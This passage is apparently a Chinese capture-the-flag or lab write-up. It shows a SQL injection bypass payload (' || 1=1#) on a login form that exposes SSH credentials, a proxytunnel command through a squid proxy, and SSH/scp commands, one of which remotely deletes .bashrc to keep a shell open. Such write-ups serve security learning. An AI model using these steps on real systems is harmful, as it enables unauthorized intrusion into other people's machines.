## **3、渗透测试**

### **3.1 WEB渗透**

#### 1.访问站点进行测试

![](../Images/f96d22448381c22e462e43e1418761e9.png)

#### 2.SQL注入验证

在login登录框中输入单引号，会产生报错

![](../Images/3a6824c97182489daae71485073e0c2b.png)

#### 3.过滤参数输入

通过测试使用如下参数可以绕过系统过滤

```
' || 1=1#
```

绕过过滤后，会提示SSH服务的用户名和密码

![](../Images/44cdebea3a60afad5d8f40ef5d3b1892.png)

#### 4.创建隧道

由于测试发现22端口已经被过滤，可以通过squid进行反向代理

```
proxytunnel -p 192.168.1.6:3128 -d 127.0.0.1:22 -a 2222
```

![](../Images/fc2a9a095f898b1fd9331800f95000d0.png)

#### 5.连接SSH服务

```
ssh john@127.0.0.1 -p 2222
```

通过SSH可以连接，但是连接成功后会自动断开

![](../Images/93c4d55e6e6b017374264a496f5d21c4.png)

#### 6.测试环境变量

可能是由于 .bashrc 文件中指定的命令导致连接后直接断开

```
scp -P 2222 john@127.0.0.1:/home/john/.bashrc ./
```

![](../Images/377c62105be44473c06ed4ab2ce21ac7.png)

![](../Images/c7bbdff6a10065ce5f45a349e6f6f05d.png)

#### 7.远程删除环境变量文件

```
ssh -t john@127.0.0.1 -p 2222 'rm .bashrc'
```

![](../Images/9aff427cd7f5fae829d161f2a7b55667.png)

#### 8.远程连接

```
 ssh john@127.0.0.1 -p 2222
```

成功连接到主机

![](../Images/064a0b53cf7b053a8067c9808682f597.png)
